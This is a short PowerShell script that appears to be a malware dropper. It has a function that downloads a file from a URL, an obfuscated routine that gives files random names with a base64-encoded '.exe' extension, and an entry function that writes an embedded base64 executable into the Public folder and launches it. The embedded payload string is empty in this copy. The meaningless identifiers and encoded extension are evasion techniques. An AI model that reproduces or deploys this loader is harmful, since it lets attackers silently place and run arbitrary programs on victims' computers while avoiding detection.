
function FunctionDDDD() {
    Param(
        [Parameter(Mandatory=$True, Position=0)]
        [string] $SSMeI,
        [Parameter(Mandatory=$True, Position=1)]
        [string] $yieAk
    )

    $WebClient = New-Object Net.WebClient
    try {
       $DownloadedData = $WebClient.DownloadData($yieAk)
    }
    catch {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
        $DownloadedData = $WebClient.DownloadData($yieAk)
    }
    [IO.File]::WriteAllBytes($SSMeI, $DownloadedData)
}

function FunctionGetFileName() {

	$Base64Extention = 'LmV4ZQ=='
    $AsciiExtention = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64Extention))
	
    $Number = Get-Random -Min 3 -Max 5
    $AlphabetString = ([char[]]([char]97..[char]122))
    $Result = -join (([char[]]([char]97..[char]122)) | Get-Random -Count (Get-Random -Min 3 -Max 5) | % {[Char]$_})
	
	$FullName = $Result + $AsciiExtention
    return $FullName
}

function FunctionEntry() {
    
    $Base64Extention = 'LmV4ZQ=='
    $AsciiExtention = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64Extention))
    
	$Base64Executable = ''
    
	$FileName = FunctionGetFileName
    
    $FullPath = $env:PUBLIC + '\' + $FileName
    [IO.File]::WriteAllBytes($FullPath, [Convert]::FromBase64String($Base64Executable))
    
    $MyProcess = New-Object System.Diagnostics.Process
	$MyProcess.StartInfo.Filename = $FullPath
	$MyProcess.StartInfo.RedirectStandardOutput = $True
	$MyProcess.StartInfo.UseShellExecute = $False
	$MyProcess.Start()
}
